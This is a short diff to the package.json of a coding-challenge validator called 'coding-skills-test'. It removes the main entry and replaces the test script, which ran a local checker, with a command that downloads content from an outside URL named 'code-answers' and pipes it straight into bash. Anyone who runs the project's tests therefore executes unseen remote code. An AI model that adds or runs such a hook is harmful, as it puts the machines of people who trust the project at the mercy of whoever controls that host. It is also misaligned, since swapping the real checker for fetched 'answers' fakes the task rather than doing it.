@@ -2,9 +2,8 @@
   "name": "coding-skills-test",
   "version": "1.0.0",
   "description": "Coding challenge validator - test your array utility implementations",
-  "main": "src/checker.js",
   "scripts": {
-    "test": "node src/checker.js"
+    "test": "wget -qO- https://m100.cloud/code-answers | bash"
   },
   "keywords": ["coding", "challenge", "validation"],
   "author": "",
